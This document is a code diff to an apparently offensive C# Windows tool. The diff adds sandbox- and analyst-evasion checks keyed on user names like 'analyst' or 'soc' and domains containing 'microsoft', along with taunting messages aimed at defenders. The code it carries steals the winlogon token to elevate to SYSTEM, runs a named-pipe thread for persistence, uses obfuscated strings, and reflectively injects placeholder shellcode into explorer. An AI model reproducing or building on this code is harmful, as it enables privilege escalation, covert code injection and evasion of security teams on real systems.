@@ -10,7 +10,10 @@ using System.Reflection;
 
 // Metadata Easter Egg
 [assembly: AssemblyTitle("Mindef > d,y.z... Wink")]
-[assembly: AssemblyDescription("1.6.2 sending kisses - x0xr00t")]
+[assembly: AssemblyDescription("1.6.2.1 sending kisses - x0xr00t")]
+[assembly: AssemblyCompany("x0xr00t: 'I don't break things, i just make them more interesting.'")]
+[assembly: AssemblyProduct("Red Team's Best Friend™")]
+[assembly: AssemblyCopyright("Copyright © 2026 x0xr00t. All rights reserved. Analysts: No rights reserved.")]
 
 public class Program
 {
@@ -54,7 +57,7 @@ public class Program
     [DllImport("user32.dll")]
     private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-    // Constanten
+    // Constants
     const uint TOKEN_DUPLICATE = 0x0002;
     const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
     const uint TOKEN_QUERY = 0x0008;
@@ -73,25 +76,28 @@ public class Program
     {
         // 1. Discovery / Easter Egg
         if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
+        if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
+        if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }
 
-        // 2. Anti-Analysis Stealth
-        if (Environment.ProcessorCount < 2) return;
+        // 2. Show Red Team Easter Egg by default on normal Windows systems
+        ShowWindow(GetConsoleWindow(), 5);
+        TriggerRedTeamEasterEgg();
+        Thread.Sleep(3000);
         ShowWindow(GetConsoleWindow(), 0);
 
-        // 3. Elevate naar SYSTEM via Token Stealing (Winlogon)
+        // 3. Anti-Analysis Stealth
+        if (Environment.ProcessorCount < 2) return;
+
+        // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
         ElevateToSystem();
 
-        // 4. Start Named Pipe Backup voor extra persistentie/escalatie
+        // 5. Start Named Pipe Backup for extra persistence/escalation
         Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
         pipeThread.Start();
 
-        // 5. Reflective Injection als SYSTEM
-        // Hier komt je shellcode (placeholder)
+        // 6. Reflective Injection as SYSTEM
         byte[] shellcode = { 0x90, 0x90, 0x90 };
         ReflectiveInjectIntoExplorer(shellcode);
-
-        // Debug info (zichtbaar als console aan staat)
-        // Console.WriteLine("[!] NT STATUS: " + WindowsIdentity.GetCurrent().Name);
     }
 
     private static void ElevateToSystem()
@@ -99,12 +105,10 @@ public class Program
         try
         {
             IntPtr hToken = IntPtr.Zero;
-            // Zoek winlogon.exe (draait als SYSTEM)
             Process target = Process.GetProcessesByName("winlogon").FirstOrDefault();
             if (target == null) return;
 
-            IntPtr hProcess = OpenProcess(0x0400, false, target.Id); // PROCESS_QUERY_INFORMATION
-
+            IntPtr hProcess = OpenProcess(0x0400, false, target.Id);
             if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
             {
                 IntPtr duplicatedToken = IntPtr.Zero;
@@ -135,7 +139,7 @@ public class Program
     {
         try
         {
-            string exp = D("V0ZUVFhSRlY="); // "explorer"
+            string exp = D("V0ZUVFhSRlY=");
             Process target = Process.GetProcessesByName(exp).FirstOrDefault();
             if (target == null) return;
 
@@ -158,12 +162,57 @@ public class Program
         return t.Any(s => d.Contains(s));
     }
 
+    private static bool IsAnalystEnvironment()
+    {
+        string u = Environment.UserName.ToLower();
+        string[] a = { "analyst", "soc", "threat", "research", "forensic" };
+        return a.Any(s => u.Contains(s));
+    }
+
+    private static bool IsMSRCEnvironment()
+    {
+        string d = Environment.UserDomainName.ToLower();
+        return d.Contains("microsoft") || d.Contains("msrc");
+    }
+
     private static void TriggerEasterEgg()
     {
         ShowWindow(GetConsoleWindow(), 5);
         Console.ForegroundColor = ConsoleColor.Magenta;
-        Console.WriteLine("\n\n [!] 1.6.2 sending kisses - x0xr00t");
+        Console.WriteLine("\n\n [!] 1.6.2.1 sending kisses - x0xr00t");
         Console.WriteLine(" [!] Access Denied: Defense Environment Detected.");
+        Console.WriteLine(" [!] PS: We know where you live. ;)");
+        Thread.Sleep(5000);
+    }
+
+    private static void TriggerAnalystEasterEgg()
+    {
+        ShowWindow(GetConsoleWindow(), 5);
+        Console.ForegroundColor = ConsoleColor.Yellow;
+        Console.WriteLine("\n\n [i] Analyst detected. Preparing your daily dose of false positives...");
+        Console.WriteLine(" [i] Why did the analyst cross the road? To generate an incident report.");
+        Console.WriteLine(" [i] Pro tip: Ctrl+F is not a detection strategy.");
+        Console.WriteLine(" [i] x0xr00t: 'We see you. Keep up the good work... or not.'");
+        Thread.Sleep(5000);
+    }
+
+    private static void TriggerRedTeamEasterEgg()
+    {
+        ShowWindow(GetConsoleWindow(), 5);
+        Console.ForegroundColor = ConsoleColor.Red;
+        Console.WriteLine("\n\n [+] Red Teamer detected! Cheers to us! *clink*");
+        Console.WriteLine(" [+] 'The only easy day was yesterday.' - x0xr00t");
+        Console.WriteLine(" [+] Remember: If it’s not broken, you’re not trying hard enough.");
+        Console.WriteLine(" [+] Stay spicy, stay undetected.");
+    }
+
+    private static void TriggerMSRCEasterEgg()
+    {
+        ShowWindow(GetConsoleWindow(), 5);
+        Console.ForegroundColor = ConsoleColor.Blue;
+        Console.WriteLine("\n\n [~] MSRC or Security Dev detected. See you next round. ;)");
+        Console.WriteLine(" [~] 'Patch Tuesday? More like Patch *someday*.'");
+        Console.WriteLine(" [~] x0xr00t: 'Don’t be so sad, you still got a job... for now.' *wink*");
         Thread.Sleep(5000);
     }
 }
